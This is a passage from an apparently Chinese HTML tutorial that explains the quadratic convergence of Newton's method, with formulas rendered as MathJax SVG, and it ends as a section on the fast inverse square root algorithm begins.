91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7305.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
这意味着每次迭代时误差大致是上一轮误差的平方。也就是说，当我们接近解决方案时，误差的大小减少得非常快，接近于平方的收敛速度。</p>
<p><strong>对数与准确位数</strong></p>
<p>由于 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.581ex;" xmlns="http://www.w3.org/2000/svg" width="8.938ex" height="2.203ex" role="img" focusable="false" viewBox="0 -717 3950.4 973.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(944.7,0)"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="TeXAtom" transform="translate(1311,-241.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(3012.8,0)"><path data-c="2061" d=""></path></g><g data-mml-node="msub" transform="translate(3179.4,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mi" transform="translate(477,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>
大致等于答案 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>
的有效数字的位数，误差的平方恰好对应着有效数字的位数翻倍。因此，牛顿法表现出的是<strong>二次收敛</strong>（Quadratic
Convergence）特性。</p>
<p><strong>一般性的二次收敛</strong></p>
<p>事实上，这种二次收敛不仅限于求平方根的问题。根据详细的证明可以证明，一般来说，对于任何合适的函数，牛顿法的误差会以二次速度收敛。假设函数的导数
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="9.195ex" height="2.283ex" role="img" focusable="false" viewBox="0 -759 4064 1009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(880.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1269.5,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1841.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2508.2,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(3564,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span> 且二阶导数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.486ex" height="2.283ex" role="img" focusable="false" viewBox="0 -759 2424.9 1009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,363) scale(0.707)"><g data-c="2033"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" transform="translate(275,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1074.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1463.9,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2035.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
连续，则牛顿法至少能保证二次收敛。</p>
<p>具体公式如下： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.172ex;" xmlns="http://www.w3.org/2000/svg" width="22.904ex" height="5.495ex" role="img" focusable="false" viewBox="0 -1469 10123.4 2429"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="TeXAtom" transform="translate(477,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1952.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(2508.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3564.2,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1222.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msup" transform="translate(1500.4,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(2380.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(2769.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3849.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4238.2,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(824.2,-710)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msup" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,289) scale(0.707)"><g data-c="2033"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" transform="translate(275,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1352.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1741.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2640.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3029.9,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="4716.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8742.6,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="msubsup" transform="translate(9242.8,0)"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mn" transform="translate(477,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(477,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>
这就是牛顿法的二次收敛特性，它使得每次迭代都能显著提高结果的精度。</p>
<h4 id="平方根倒数速算法">平方根倒数速算法</h4>
<p>倒数平方根是浮点数的一个重要计算，广泛应用于计算归一化向量，而归一化向量又在各种模拟场景中得到广泛应用，例如计算机图形学（例如，用于确定入射角和反射角来模拟光照）。</p>
